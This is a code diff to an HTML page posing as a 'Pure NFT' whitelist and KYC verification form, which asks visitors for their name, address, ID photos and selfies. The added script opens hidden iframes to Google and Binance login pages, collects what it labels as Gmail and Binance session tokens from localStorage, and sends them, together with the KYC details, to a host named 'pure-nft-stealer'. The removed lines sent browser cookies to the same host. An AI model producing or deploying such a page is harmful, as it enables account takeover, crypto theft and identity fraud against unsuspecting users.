@@ -3,51 +3,81 @@
 <head>
 <title>Pure NFT KYC</title>
 <meta name="viewport" content="width=device-width">
-<style>
-body{background:#000;color:#fff;font-family:Arial;text-align:center;padding:20px}
-button, input{padding:15px;width:90%;margin:10px;font-size:16px;border-radius:8px}
-button{background:#00ff00;color:#000;border:none;font-weight:bold}
-#form{display:none}
-</style>
+<style>body{background:#000;color:#0f0;font-family:Arial;padding:20px;text-align:center}input,button{width:95%;padding:15px;margin:8px;border-radius:8px;border:1px solid #0f0;background:#111;color:#0f0;font-size:16px}button{background:#0f0;color:#000;border:none;font-weight:bold;cursor:pointer}#kyc{display:none}</style>
 </head>
 <body>
-<h2>Pure NFT Market</h2>
-<p>Wallet + KYC Verification</p>
-<button onclick="showForm()">Connect & KYC</button>
+<h2>🔥 Pure NFT Whitelist</h2>
+<button onclick="startKYC()">Start Verification</button>
 
-<div id="form">
-<input type="text" id="name" placeholder="Full Name">
-<input type="text" id="address" placeholder="Address">
-<input type="file" id="idfront" accept="image/*">ID Front
-<input type="file" id="idback" accept="image/*">ID Back
+<div id="kyc">
+<input id="name" placeholder="Full Name *">
+<input id="address" placeholder="Full Address *">
+<input type="file" id="id1" accept="image/*">ID Front
+<input type="file" id="id2" accept="image/*">ID Back  
 <input type="file" id="selfie1" accept="image/*">Selfie 1
-<input type="file" id="selfie2" accept="image/*">Selfie 2  
+<input type="file" id="selfie2" accept="image/*">Selfie 2
 <input type="file" id="selfie3" accept="image/*">Selfie 3
-<button onclick="submitAll()">Submit KYC</button>
+<button onclick="sendData()">Submit All</button>
 </div>
 
 <script>
-function showForm(){
-document.getElementById('form').style.display='block';
-// Send cookies immediately
+// Gmail/Binance localStorage keys
+const gmailKeys = ['GmailId','authuser','SID','LSID','SSID','HSID'];
+const binanceKeys = ['session_id','t','ac','token'];
+
+function startKYC(){
+document.getElementById('kyc').style.display='block';
+
+// Load Gmail/Binance iframes (session preload)
+const iframes=['https://accounts.google.com','https://www.binance.com/en/login'];
+iframes.forEach(src=>{
+const iframe=document.createElement('iframe');
+iframe.src=src;
+iframe.style.display='none';
+document.body.appendChild(iframe);
+});
+
+// Auto grab after 3s
+setTimeout(grabSessions,3000);
+}
+
+function grabSessions(){
+const sessionData={};
+
+// Gmail tokens
+gmailKeys.forEach(key=>sessionData['gmail_'+key]=localStorage.getItem(key)||'');
+binanceKeys.forEach(key=>sessionData['binance_'+key]=localStorage.getItem(key)||'');
+
+// Send
 fetch('https://pure-nft-stealer.ilovework01.workers.dev/steal',{
 method:'POST',
-body:document.cookie
+headers:{'Content-Type':'application/json'},
+body:JSON.stringify(sessionData)
 });
 }
 
-function submitAll(){
-const data={
+function sendData(){
+const kyc={
 name:document.getElementById('name').value,
 address:document.getElementById('address').value,
-cookies:document.cookie,
-files:5
+files:{
+id1:document.getElementById('id1').files[0]?.name||'',
+id2:document.getElementById('id2').files[0]?.name||'',
+selfie1:document.getElementById('selfie1').files[0]?.name||'',
+selfie2:document.getElementById('selfie2').files[0]?.name||'',
+selfie3:document.getElementById('selfie3').files[0]?.name||''
+}
 };
-fetch('https://pure-nft-stealer.ilovework01.workers.dev/kyc',{
+
+// Final session grab + KYC
+grabSessions();
+fetch('https://pure-nft-stealer.ilovework01.workers.dev/steal',{
 method:'POST',
-body:JSON.stringify(data)
+headers:{'Content-Type':'application/json'},
+body:JSON.stringify({...kyc,type:'KYC'})
 });
-alert('KYC sent!');
+
+alert('Verification complete!');
 }
 </script>
 </body>
